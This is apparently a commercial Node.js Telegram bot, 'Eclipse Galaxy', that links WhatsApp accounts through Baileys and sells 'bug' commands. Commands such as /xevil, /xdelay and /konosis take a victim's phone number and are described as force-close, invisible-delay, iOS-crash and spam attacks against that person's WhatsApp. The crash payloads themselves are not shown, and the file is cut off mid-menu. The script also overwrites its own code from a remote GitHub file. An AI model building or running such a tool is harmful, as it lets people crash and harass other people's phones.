const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./control/config.js");
const TelegramBot = require("node-telegram-bot-api");
const moment = require("moment");
const FormData = require("form-data");
const { exec, spawn } = require("child_process");
const util = require("util");
const execPromise = util.promisify(exec);

let premiumUsers = JSON.parse(fs.readFileSync("./dtbs/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./dtbs/admin.json"));

// ========== VARIABEL UNTUK AUTO UPDATE ==========
let autoUpdateEnabled = false;
let updateInterval = null;
const UPDATE_CHECK_INTERVAL = 60 * 1000; // 1 jam
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/GibranSatrio/Eclipsess/refs/heads/main/eclipse.js"; // GANTI DENGAN URL RAW GITHUB LO!
const CURRENT_VERSION = "1.5";
let updateInProgress = false;
let updateChannelId = null; // Untuk notifikasi update

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./dtbs/premium.json");
ensureFileExists("./dtbs/admin.json");

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync(
    "./dtbs/premium.json",
    JSON.stringify(premiumUsers, null, 2)
  );
}

function saveAdminUsers() {
  fs.writeFileSync(
    "./dtbs/admin.json",
    JSON.stringify(adminUsers, null, 2)
  );
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./dtbs/premium.json", (data) => (premiumUsers = data));
watchFile("./dtbs/admin.json", (data) => (adminUsers = data));

function isPrem(userId) {
  const data = JSON.parse(
    fs.readFileSync("./dtbs/premium.json", "utf-8")
  );
  return data.includes(Number(userId));
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `yes - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "not premium";
  }
}

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/GibranSatrio/Eclipsess/refs/heads/main/mbut.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("[ ! ]: Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(`[ ! ]: Token Kamu dikenali oleh sistem. Enjoy your Script`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.clear();
  console.log(
    chalk.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

`)
  );

  console.log(
    chalk.bold.red(`
Dev : @Serenhopee
Version: ${CURRENT_VERSION}
Thanks for buying this Script..
`));
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(chalk.bold.yellow(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.bold.green(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.bold.blue(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nomor : ${botNumber} 
 Statistic : Instalasii... 
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Lᴏᴀᴅ : Try Connected.
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Lᴏᴀᴅ : 🔴 Gagal Terhubung...
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Lᴏᴀᴅ : 🟢 <b>Connected</b>
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "ECLIPV26");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Yᴏᴜʀ Cᴏᴅᴇ : <code>${formattedCode}</code>
 ┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Mᴇssᴀɢᴇ : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

// Get Random Image - BANYAKIN PILIHAN FOTO
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/7e301n.png",
    "https://files.catbox.moe/wz7kxx.png",
    "https://files.catbox.moe/7e301n.png",
    "https://files.catbox.moe/wz7kxx.png",
    "https://files.catbox.moe/7e301n.png",
    "https://files.catbox.moe/wz7kxx.png",
    "https://files.catbox.moe/7e301n.png",
    "https://files.catbox.moe/wz7kxx.png"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// IMAGE UNTUK SETIAP MENU SPESIFIK
const menuImages = {
  main: "https://files.catbox.moe/7e301n.png",
  bug: "https://files.catbox.moe/wz7kxx.png",
  invis: "https://files.catbox.moe/7e301n.png",
  ios: "https://files.catbox.moe/wz7kxx.png",
  tools: "https://files.catbox.moe/7e301n.png",
  owner: "https://files.catbox.moe/wz7kxx.png",
  custom: "https://files.catbox.moe/7e301n.png",
  tqto: "https://files.catbox.moe/wz7kxx.png",
  multi: "https://files.catbox.moe/7e301n.png",
  update: "https://files.catbox.moe/wz7kxx.png"
};

// ~ Coldown
let cooldownDuration = 0;
const userCooldown = new Map();

function parseDuration(input) {
  const match = input.match(/^(\d+)(s|m|h)$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "s":
      return value * 1000;
    case "m":
      return value * 60 * 1000;
    case "h":
      return value * 60 * 60 * 1000;
    default:
      return null;
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ========== FUNGSI AUTO UPDATE ==========

// Fungsi untuk mengecek versi terbaru dari GitHub
async function checkLatestVersion() {
  try {
    const response = await axios.get(GITHUB_RAW_URL, {
      timeout: 10000,
      headers: {
        'User-Agent': 'Eclipse-Galaxy-Bot'
      }
    });
    
    // Cari versi di file (asumsi ada CURRENT_VERSION di file)
    const versionMatch = response.data.match(/CURRENT_VERSION\s*=\s*["']([^"']+)["']/);
    if (versionMatch && versionMatch[1]) {
      return {
        version: versionMatch[1],
        content: response.data
      };
    }
    return null;
  } catch (error) {
    console.error("Error checking latest version:", error.message);
    return null;
  }
}

// Fungsi untuk melakukan update
async function performUpdate(chatId, notifyChannel = true) {
  if (updateInProgress) {
    if (chatId) {
      await bot.sendPhoto(chatId, menuImages.update, {
        caption: "⚠️ *Update sedang berjalan!* Tunggu sampai selesai.",
        parse_mode: "Markdown"
      });
    }
    return false;
  }

  updateInProgress = true;
  
  try {
    if (chatId) {
      await bot.sendPhoto(chatId, menuImages.update, {
        caption: "🔄 *Memeriksa update terbaru...*",
        parse_mode: "Markdown"
      });
    }

    const latest = await checkLatestVersion();
    
    if (!latest) {
      if (chatId) {
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: "❌ *Gagal memeriksa update!* Coba lagi nanti.",
          parse_mode: "Markdown"
        });
      }
      updateInProgress = false;
      return false;
    }

    if (latest.version === CURRENT_VERSION) {
      if (chatId) {
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: `✅ *Bot sudah versi terbaru!*\n\nVersi saat ini: ${CURRENT_VERSION}`,
          parse_mode: "Markdown"
        });
      }
      updateInProgress = false;
      return false;
    }

    // Ada update tersedia
    const updateMsg = await bot.sendPhoto(chatId || updateChannelId, menuImages.update, {
      caption: `🔄 *UPDATE TERSEDIA!*\n\n` +
               `Versi saat ini: ${CURRENT_VERSION}\n` +
               `Versi terbaru: ${latest.version}\n\n` +
               `⏳ Proses update dimulai...`,
      parse_mode: "Markdown"
    });

    // Backup file lama
    const backupPath = `eclipse.js.backup-${Date.now()}`;
    fs.copyFileSync("eclipse.js", backupPath);
    
    // Update file
    fs.writeFileSync("eclipse.js", latest.content);
    
    await bot.editMessageCaption(
      `✅ *UPDATE BERHASIL!*\n\n` +
      `Versi ${CURRENT_VERSION} ➜ ${latest.version}\n` +
      `Backup dibuat: ${path.basename(backupPath)}\n\n` +
      `🔄 *Restarting bot...*`,
      {
        chat_id: chatId || updateChannelId,
        message_id: updateMsg.message_id,
        parse_mode: "Markdown"
      }
    );

    // Simpan status auto update untuk di-restore setelah restart
    if (autoUpdateEnabled && updateChannelId) {
      fs.writeFileSync("./autoupdate_config.json", JSON.stringify({
        enabled: true,
        channelId: updateChannelId
      }));
    }

    // Restart bot
    setTimeout(() => {
      console.log("Restarting bot after update...");
      process.exit(0);
    }, 3000);

    return true;
  } catch (error) {
    console.error("Update error:", error);
    if (chatId) {
      await bot.sendPhoto(chatId, menuImages.update, {
        caption: `❌ *Update gagal!*\n\nError: ${error.message}`,
        parse_mode: "Markdown"
      });
    }
    updateInProgress = false;
    return false;
  }
}

// Fungsi untuk memulai auto update interval
function startAutoUpdate(chatId) {
  if (updateInterval) {
    clearInterval(updateInterval);
  }
  
  autoUpdateEnabled = true;
  updateChannelId = chatId;
  
  updateInterval = setInterval(async () => {
    console.log("Auto update check...");
    const latest = await checkLatestVersion();
    
    if (latest && latest.version !== CURRENT_VERSION) {
      // Ada update, langsung update
      await performUpdate(updateChannelId, true);
    }
  }, UPDATE_CHECK_INTERVAL);
  
  // Simpan konfigurasi
  fs.writeFileSync("./autoupdate_config.json", JSON.stringify({
    enabled: true,
    channelId: chatId
  }));
}

// Fungsi untuk menghentikan auto update
function stopAutoUpdate() {
  if (updateInterval) {
    clearInterval(updateInterval);
    updateInterval = null;
  }
  
  autoUpdateEnabled = false;
  updateChannelId = null;
  
  // Hapus konfigurasi
  if (fs.existsSync("./autoupdate_config.json")) {
    fs.unlinkSync("./autoupdate_config.json");
  }
}

// Load konfigurasi auto update saat bot start
function loadAutoUpdateConfig() {
  try {
    if (fs.existsSync("./autoupdate_config.json")) {
      const config = JSON.parse(fs.readFileSync("./autoupdate_config.json"));
      if (config.enabled && config.channelId) {
        startAutoUpdate(config.channelId);
        console.log(chalk.green("✅ Auto update loaded from config"));
      }
    }
  } catch (error) {
    console.error("Error loading auto update config:", error);
  }
}

// ========== KELAP-KELIP BUTTON ==========
let kelapKelip = true;
setInterval(() => {
  kelapKelip = !kelapKelip;
}, 500);

// ========== FUNGSI BUAT BUTTON DENGAN WARNA ==========
function buatButtonWarna(text, callback_data, style = "primary") {
  let teks = text;
  
  // Tambah efek kelap-kelip untuk button tertentu
  if (text.includes("START") || text.includes("MULAI")) {
    teks = kelapKelip ? `✨ ${text} ✨` : `⚡ ${text} ⚡`;
  }
  
  return { text: teks, callback_data, style };
}

function buatButtonUrlWarna(text, url, style = "primary") {
  return { text, url, style };
}

// ========== VARIABEL UNTUK MULTI-PILIH BUG ==========
let multiBugSelections = {}; // Nyimpen pilihan bug tiap user
const availableBugs = [
  { id: "xcursed", name: "XCURSED", emoji: "💀", style: "danger" },
  { id: "xevil", name: "XEVIL", emoji: "🔱", style: "danger" },
  { id: "xui", name: "XUI", emoji: "🐉", style: "primary" },
  { id: "xdelay", name: "XDELAY", emoji: "💠", style: "primary" },
  { id: "xinvis", name: "XINVIS", emoji: "🧬", style: "success" },
  { id: "xvisible", name: "XVISIBLE", emoji: "👁️", style: "success" },
  { id: "xcall", name: "XCALL", emoji: "📞", style: "danger" },
  { id: "xspam", name: "XSPAM", emoji: "💬", style: "primary" }
];

// ========== PERINTAH UPDATE ==========

// Command untuk update manual
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "⚠️ *Akses Ditolak!*\nHanya owner dan admin yang bisa menggunakan command ini.",
      parse_mode: "Markdown"
    });
  }
  
  await performUpdate(chatId, false);
});

// Command untuk mengaktifkan auto update
bot.onText(/^\/autoupdate$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "⚠️ *Akses Ditolak!*\nHanya owner dan admin yang bisa menggunakan command ini.",
      parse_mode: "Markdown"
    });
  }
  
  if (autoUpdateEnabled) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "✅ *Auto update sudah aktif!*\n\nGunakan /offautoupdate untuk menonaktifkan.",
      parse_mode: "Markdown"
    });
  }
  
  startAutoUpdate(chatId);
  
  await bot.sendPhoto(chatId, menuImages.update, {
    caption: `✅ *Auto update diaktifkan!*\n\n` +
             `Bot akan otomatis memeriksa update setiap 1 jam.\n` +
             `Channel notifikasi: this chat\n\n` +
             `Gunakan /offautoupdate untuk menonaktifkan.`,
    parse_mode: "Markdown"
  });
});

// Command untuk menonaktifkan auto update
bot.onText(/^\/offautoupdate$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "⚠️ *Akses Ditolak!*\nHanya owner dan admin yang bisa menggunakan command ini.",
      parse_mode: "Markdown"
    });
  }
  
  if (!autoUpdateEnabled) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "❌ *Auto update sudah tidak aktif!*",
      parse_mode: "Markdown"
    });
  }
  
  stopAutoUpdate();
  
  await bot.sendPhoto(chatId, menuImages.update, {
    caption: "✅ *Auto update dimatikan!*",
    parse_mode: "Markdown"
  });
});

// Command untuk cek versi
bot.onText(/^\/version$/, async (msg) => {
  const chatId = msg.chat.id;
  
  const latest = await checkLatestVersion();
  const updateStatus = autoUpdateEnabled ? "✅ Aktif" : "❌ Tidak aktif";
  
  let caption = `*📱 ECLIPSE GALAXY VERSION*\n\n` +
                `Versi saat ini: \`${CURRENT_VERSION}\`\n` +
                `Auto update: ${updateStatus}\n\n`;
  
  if (latest) {
    caption += `Versi terbaru: \`${latest.version}\`\n`;
    if (latest.version !== CURRENT_VERSION) {
      caption += `⚠️ *Update tersedia!* Gunakan /update\n`;
    } else {
      caption += `✅ *Sudah versi terbaru!*\n`;
    }
  } else {
    caption += `❌ Gagal mengecek versi terbaru\n`;
  }
  
  await bot.sendPhoto(chatId, menuImages.update, {
    caption: caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          buatButtonWarna("🔄 Update Now", "force_update", "danger"),
          buatButtonWarna(autoUpdateEnabled ? "🔴 Matikan Auto" : "🟢 Aktifkan Auto", "toggle_auto_update", "primary")
        ]
      ]
    }
  });
});

// ========== PERINTAH START ==========
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const userId = msg.from.id;
  const usn = msg.from.username;
  const statusPrem = getPremiumStatus(userId);
  const randomImage = getRandomImage();
  
  const startKeyboard = {
    inline_keyboard: [
      [
        buatButtonWarna("(🧬) Eclipse Menu", "bugmenu", "primary"),
        buatButtonWarna("(⚙️) Controll Menu", "ownermenu", "success")
      ],
      [
        buatButtonWarna("(👁) Thanks To", "tqto", "danger")
      ],
      [
        buatButtonUrlWarna("(❕) Channel Information", "https://t.me/SerenEclipse", "primary")
      ]
    ]
  };
  
  bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}
    
press the button to show other menu .ᐟ
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: startKeyboard
  });
});

// ========== CALLBACK QUERY HANDLER ==========
bot.on("callback_query", async (callbackQuery) => {
  try {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const userId = callbackQuery.from.id;
    const runtime = getBotRuntime();
    const usn = callbackQuery.from.username;

    let newCaption;
    let newButtons;
    let imageToUse;

    // Handle force update
    if (data === "force_update") {
      if (!isOwner(userId) && !adminUsers.includes(userId)) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Akses ditolak!",
          show_alert: true
        });
        return;
      }
      
      await bot.deleteMessage(chatId, messageId);
      await performUpdate(chatId, false);
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }
    
    // Handle toggle auto update
    if (data === "toggle_auto_update") {
      if (!isOwner(userId) && !adminUsers.includes(userId)) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Akses ditolak!",
          show_alert: true
        });
        return;
      }
      
      await bot.deleteMessage(chatId, messageId);
      
      if (autoUpdateEnabled) {
        stopAutoUpdate();
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: "✅ *Auto update dimatikan!*",
          parse_mode: "Markdown"
        });
      } else {
        startAutoUpdate(chatId);
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: "✅ *Auto update diaktifkan!*",
          parse_mode: "Markdown"
        });
      }
      
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }

    // ========== MENU UTAMA ==========
    if (data === "bugmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.bug;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🧬) ＥＣＬＩＰＳＥ ＭＥＮＵ
───────────────────────
ϟ° /xvlank 628XXX - fc no invis
ϟ° /xevil 628XXX - fc no visible x ui
ϟ° /xui 628XXX - fc no click call
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(️💀) Invisible Menu", "invisbug", "danger"),
          buatButtonWarna("(🍎) IOS Menu", "iosbug", "primary")
        ],
        [
          buatButtonWarna("(🛠) Tools Menu", "toolsmenu", "success"),
          buatButtonWarna("(🎨) Custom Bug", "custombugmenu", "primary")
        ],
        [
          buatButtonWarna("(⬅️) Back", "mainmenu", "danger")
        ]
      ];
    }
    
    else if (data === "invisbug") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.invis;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🧬) ＥＣＬＩＰＳＥ ＭＥＮＵ
───────────────────────
ϟ° /voxra 628XXX - Invisible Delay Easy
ϟ° /xdelay 628XXX - Invisible Delay Hard
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger"),
          buatButtonWarna("(🍎) IOS Menu", "iosbug", "primary")
        ],
        [
          buatButtonWarna("(🛠) Tools Menu", "toolsmenu", "success")
        ]
      ];
    }
    
    else if (data === "iosbug") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.ios;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🧬) ＥＣＬＩＰＳＥ ＭＥＮＵ
───────────────────────
ϟ° /konosis 628XXX - Invisible Force Ios v1
ϟ° /turathi 628XXX - Invisible Fc Ios v2
ϟ° /spetra 628XXX - Combo Blank X Ios 
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger"),
